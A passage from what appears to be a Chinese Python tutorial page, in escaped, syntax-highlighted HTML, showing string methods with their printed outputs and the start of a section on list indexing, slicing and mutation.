&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;str.upper() : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;upper&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# str.upper() :  THIS IS STRING EXAMPLE FROM RUNOOB....WOW!!!&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;this is string example from runoob....wow!!!&#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;str.zfill : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;zfill&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;40&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# str.zfill :  this is string example from runoob....wow!!!&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;str.zfill : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;zfill&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;50&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# str.zfill :  000000this is string example from runoob....wow!!!&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;runoob2016&#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;isdecimal&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# False&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;23443434&#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;isdecimal&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# True&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
str.capitalize() :  This is string example from runoob....wow!!!
str.center(40, &#39;*&#39;) :  ****************[runoob]****************
str.count(&#39;o&#39;) :  3
str.count(&#39;run&#39;, 0, 10) :  1
菜鸟教程
UTF-8 编码： b&#39;\xe8\x8f\x9c\xe9\xb8\x9f\xe6\x95\x99\xe7\xa8\x8b&#39;
GBK 编码： b&#39;\xb2\xcb\xc4\xf1\xbd\xcc\xb3\xcc&#39;
UTF-8 解码： 菜鸟教程
GBK 解码： 菜鸟教程
True
True
False
False
原始字符串: runoob	12345	abc
替换 \t 符号: runoob  12345   abc
使用 2 个空格替换 \t 符号: runoob  12345 abc
使用 3 个空格: runoob   12345 abc
使用 4 个空格: runoob  12345   abc
使用 5 个空格: runoob    12345     abc
使用 6 个空格: runoob      12345 abc
7
7
-1
7
7
True
False
True
True
False
True
False
False
True
False
True
True
False
True
False
True
False
r-u-n-o-o-b
runoob
6
5
Runoob example....wow!!!**************************
runoob example....wow!!!
this is string example....wow!!!     
this is string example....wow!!!8888888
th3s 3s str3ng 2x1mpl2....w4w!!!
最大字符: u
最小字符: b
菜鸟教程旧地址： www.w3cschool.cc
菜鸟教程新地址： www.runoob.com
thwas was string example....wow!!!
5
5
-1
2
2
-1
5
******************this is string example....wow!!!
     this is string example....wow!!!
*****this is string example....wow!!!
[&#39;this&#39;, &#39;is&#39;, &#39;string&#39;, &#39;example....wow!!!&#39;]
[&#39;th&#39;, &#39;s is string example....wow!!!&#39;]
[&#39;this is string example....&#39;, &#39;o&#39;, &#39;!!!&#39;]
[&#39;Google&#39;, &#39;Runoob#Taobao#Facebook&#39;]
[&#39;ab c&#39;, &#39;&#39;, &#39;de fg&#39;, &#39;kl&#39;]
[&#39;ab c\n&#39;, &#39;\n&#39;, &#39;de fg\r&#39;, &#39;kl\r\n&#39;]
True
True
False
3abcrunoob3
THIS IS STRING EXAMPLE....WOW!!!
tHIS iS sTRING eXAMPLE....wow!!!
This Is String Example From Runoob....Wow!!!
Hello B2B2B2 And 3G3G3G
th3s 3s str3ng 2x1mpl2....w4w!!!
str.upper() :  THIS IS STRING EXAMPLE FROM RUNOOB....WOW!!!
str.zfill :  this is string example from runoob....wow!!!
str.zfill :  000000this is string example from runoob....wow!!!
False
True
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;列表&#34;&gt;&lt;a href=&#34;#列表&#34; class=&#34;headerlink&#34; title=&#34;列表&#34;&gt;&lt;/a&gt;列表&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;索引截取方式与元组相同&lt;/li&gt;
&lt;li&gt;截取后成为一个新列表&lt;/li&gt;
&lt;li&gt;元素在打方括号中，以逗号分隔&lt;/li&gt;
&lt;li&gt;列表的元素可改变&lt;/li&gt;
&lt;li&gt;元素可以是元组&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1.2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;999&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
list2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 输出完整列表&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [&#39;test&#39;, 1, 1.2, 999]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 输出列表第一个元素&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# test&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 从第二个开始输出到第三个元素&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [1, 1.2]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 输出从第三个元素开始的所有元素&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [1.2, 999]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;list2 &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 输出两次列表&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [1, &#39;test&#39;, 1, &#39;test&#39;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; list2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 连接列表&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [&#39;test&#39;, 1, 1.2, 999, 1, &#39;test&#39;]&lt;/span&gt;
list3 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;list3&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [1, 2, 3, 4, 5]&lt;/span&gt;
list3&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 修改第一元素&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;list3&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [&#39;test&#39;, 2, 3, 4, 5]&lt;/span&gt;
